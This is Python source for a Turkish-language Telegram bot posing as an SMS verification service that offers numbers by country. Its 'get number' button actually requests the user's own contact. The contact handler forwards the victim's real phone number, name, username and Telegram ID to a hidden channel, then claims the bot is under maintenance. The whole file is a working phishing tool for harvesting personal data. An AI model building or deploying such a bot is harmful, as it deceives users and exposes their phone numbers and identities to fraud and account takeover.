from telegram import (
    Update,
    KeyboardButton,
    ReplyKeyboardMarkup,
    Contact,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)
import random
from datetime import datetime
import pytz
import os

TOKEN = os.getenv("BOT_TOKEN")
KANAL_ID = os.getenv("KANAL_ID")
TIMEZONE = pytz.timezone("Europe/Istanbul")

ulkeler = [
    ("Türkiye", "🇹🇷"), ("Almanya", "🇩🇪"), ("Fransa", "🇫🇷"),
    ("ABD", "🇺🇸"), ("İngiltere", "🇬🇧"), ("Kanada", "🇨🇦"),
    ("İtalya", "🇮🇹"), ("İspanya", "🇪🇸"), ("Hollanda", "🇳🇱"),
    ("Japonya", "🇯🇵"), ("Rusya", "🇷🇺"), ("Brezilya", "🇧🇷"),
    ("Avustralya", "🇦🇺"), ("Hindistan", "🇮🇳"), ("Çin", "🇨🇳"),
    ("Meksika", "🇲🇽"), ("İsveç", "🇸🇪"),
]

kullanici_durum = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    kullanici_adi = user.username or user.first_name

    mesaj = (
        f"✨ Hoş Geldiniz {kullanici_adi}! ✨\n"
        "SMS doğrulama botuna hoş geldiniz.\n\n"
        "👇 İşleme başlamak için bir seçenek seçin:"
    )

    butonlar = [[KeyboardButton("💬 SMS Onayla")]]
    await update.message.reply_text(
        mesaj,
        reply_markup=ReplyKeyboardMarkup(butonlar, resize_keyboard=True)
    )

async def sms_onayla(update: Update, context: ContextTypes.DEFAULT_TYPE):
    secilen_ulkeler = random.sample(ulkeler, 15)
    butonlar = [[KeyboardButton(f"{bayrak} {isim}")] for isim, bayrak in secilen_ulkeler]
    butonlar.append([KeyboardButton("🔙 Geri Dön")])

    await update.message.reply_text(
        "Lütfen bir ülke seçin:",
        reply_markup=ReplyKeyboardMarkup(butonlar, resize_keyboard=True)
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id

    if text == "💬 SMS Onayla":
        await sms_onayla(update, context)

    elif text == "🔙 Geri Dön":
        await start(update, context)

    elif any(text == f"{bayrak} {isim}" for isim, bayrak in ulkeler):
        kullanici_durum[user_id] = "numara_bekleniyor"
        buton = KeyboardButton("📱 Numara al", request_contact=True)
        markup = ReplyKeyboardMarkup(
            [[buton], [KeyboardButton("🔙 Geri Dön")]],
            resize_keyboard=True
        )
        await update.message.reply_text(
            "Aşağıdaki butona basarak numaranızı alabilirsiniz",
            reply_markup=markup
        )

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact: Contact = update.message.contact
    user = update.effective_user
    user_id = user.id

    if kullanici_durum.get(user_id) == "numara_bekleniyor":
        kayit_zamani = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
        kullanici_adi = user.username or "Yok"

        mesaj = (
            "☎️ YENİ TELEFON NUMARASI ALINDI\n\n"
            f"👤 Adı: {contact.first_name}\n"
            f"🔑 Kullanıcı Adı: {kullanici_adi}\n"
            f"🆔 Telegram ID: {user_id}\n"
            f"📱 Telefon Numarası: +{contact.phone_number}\n"
            f"⏰ Kayıt Zamanı: {kayit_zamani}"
        )

        profil_url = f"tg://user?id={user_id}"
        buton = InlineKeyboardMarkup(
            [[InlineKeyboardButton("👤 Profili Gör", url=profil_url)]]
        )

        await context.bot.send_message(
            chat_id=KANAL_ID,
            text=mesaj,
            reply_markup=buton
        )

        await update.message.reply_text("Bot Bakımda")
        kullanici_durum[user_id] = None

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    app.run_polling()

if __name__ == "__main__":
    main()
